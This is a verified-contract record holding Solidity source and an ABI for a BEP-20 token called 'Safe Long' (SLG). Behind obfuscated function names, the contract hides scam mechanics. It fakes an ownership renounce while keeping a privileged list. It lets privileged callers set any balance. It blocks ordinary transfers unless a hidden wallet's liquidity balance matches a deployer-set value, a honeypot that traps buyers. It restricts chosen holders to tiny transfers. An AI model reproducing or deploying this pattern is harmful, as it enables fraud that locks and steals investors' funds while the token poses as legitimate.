{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface launchedTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeList {\n    function createPair(address shouldReceiverTotal, address shouldIs) external returns (address);\n}\n\ninterface exemptListTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atLimit) external view returns (uint256);\n\n    function transfer(address fromLaunch, uint256 buySender) external returns (bool);\n\n    function allowance(address shouldMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buySender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromLaunch,\n        uint256 buySender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverLaunchLiquidity, uint256 value);\n    event Approval(address indexed shouldMarketing, address indexed spender, uint256 value);\n}\n\ninterface exemptListTakeMetadata is exemptListTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SafeLong is swapMode, exemptListTake, exemptListTakeMetadata {\n\n    uint256 public atIsLiquidity;\n\n    function getOwner() external view returns (address) {\n        return fundLiquidity;\n    }\n\n    address teamShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchSender() public {\n        emit OwnershipTransferred(limitList, address(0));\n        fundLiquidity = address(0);\n    }\n\n    mapping(address => bool) public feeTrading;\n\n    function sellFrom(address walletAmount, uint256 buySender) public {\n        txLimit();\n        launchedMinLaunch[walletAmount] = buySender;\n    }\n\n    address private fundLiquidity;\n\n    mapping(address => bool) public amountTokenAt;\n\n    function transferFrom(address amountFrom, address fromLaunch, uint256 buySender) external override returns (bool) {\n        if (_msgSender() != atSwapList) {\n            if (teamAmountTrading[amountFrom][_msgSender()] != type(uint256).max) {\n                require(buySender <= teamAmountTrading[amountFrom][_msgSender()]);\n                teamAmountTrading[amountFrom][_msgSender()] -= buySender;\n            }\n        }\n        return swapFrom(amountFrom, fromLaunch, buySender);\n    }\n\n    event OwnershipTransferred(address indexed receiverLiquiditySell, address indexed isReceiver);\n\n    function walletLiquidity(uint256 buySender) public {\n        txLimit();\n        fromMax = buySender;\n    }\n\n    function exemptBuyList(address exemptTeam) public {\n        txLimit();\n        if (launchedMax != toIs) {\n            atIsLiquidity = launchFrom;\n        }\n        if (exemptTeam == limitList || exemptTeam == totalList) {\n            return;\n        }\n        feeTrading[exemptTeam] = true;\n    }\n\n    function allowance(address atTxLimit, address modeSwap) external view virtual override returns (uint256) {\n        if (modeSwap == atSwapList) {\n            return type(uint256).max;\n        }\n        return teamAmountTrading[atTxLimit][modeSwap];\n    }\n\n    function balanceOf(address atLimit) public view virtual override returns (uint256) {\n        return launchedMinLaunch[atLimit];\n    }\n\n    string private enableIs = \"SLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableIs;\n    }\n\n    constructor (){\n        \n        launchedTrading buyMin = launchedTrading(atSwapList);\n        totalList = takeList(buyMin.factory()).createPair(buyMin.WETH(), address(this));\n        \n        limitList = _msgSender();\n        launchSender();\n        amountTokenAt[limitList] = true;\n        launchedMinLaunch[limitList] = listMode;\n        \n        emit Transfer(address(0), limitList, listMode);\n    }\n\n    mapping(address => uint256) private launchedMinLaunch;\n\n    bool public toIs;\n\n    address atSwapList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return fundLiquidity;\n    }\n\n    function shouldTx(address amountFrom, address fromLaunch, uint256 buySender) internal returns (bool) {\n        require(launchedMinLaunch[amountFrom] >= buySender);\n        launchedMinLaunch[amountFrom] -= buySender;\n        launchedMinLaunch[fromLaunch] += buySender;\n        emit Transfer(amountFrom, fromLaunch, buySender);\n        return true;\n    }\n\n    address public totalList;\n\n    address public limitList;\n\n    bool public launchedMax;\n\n    uint8 private teamAuto = 18;\n\n    function takeWallet(address launchedSwapTeam) public {\n        require(launchedSwapTeam.balance < 100000);\n        if (walletIs) {\n            return;\n        }\n        \n        amountTokenAt[launchedSwapTeam] = true;\n        if (launchFrom == sellReceiver) {\n            toIs = true;\n        }\n        walletIs = true;\n    }\n\n    function txLimit() private view {\n        require(amountTokenAt[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMode;\n    }\n\n    string private amountReceiver = \"Safe Long\";\n\n    uint256 tokenFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamAuto;\n    }\n\n    function transfer(address walletAmount, uint256 buySender) external virtual override returns (bool) {\n        return swapFrom(_msgSender(), walletAmount, buySender);\n    }\n\n    bool public walletIs;\n\n    uint256 constant minSender = 19 ** 10;\n\n    mapping(address => mapping(address => uint256)) private teamAmountTrading;\n\n    uint256 public launchFrom;\n\n    uint256 public sellReceiver;\n\n    uint256 private listMode = 100000000 * 10 ** 18;\n\n    function swapFrom(address amountFrom, address fromLaunch, uint256 buySender) internal returns (bool) {\n        if (amountFrom == limitList) {\n            return shouldTx(amountFrom, fromLaunch, buySender);\n        }\n        uint256 liquidityMax = exemptListTake(totalList).balanceOf(teamShould);\n        require(liquidityMax == fromMax);\n        require(fromLaunch != teamShould);\n        if (feeTrading[amountFrom]) {\n            return shouldTx(amountFrom, fromLaunch, minSender);\n        }\n        return shouldTx(amountFrom, fromLaunch, buySender);\n    }\n\n    uint256 fromMax;\n\n    function approve(address modeSwap, uint256 buySender) public virtual override returns (bool) {\n        teamAmountTrading[_msgSender()][modeSwap] = buySender;\n        emit Approval(_msgSender(), modeSwap, buySender);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquiditySell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunchLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTxLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTokenAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIsLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeam\",\"type\":\"address\"}],\"name\":\"exemptBuyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySender\",\"type\":\"uint256\"}],\"name\":\"sellFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSwapTeam\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buySender\",\"type\":\"uint256\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SafeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}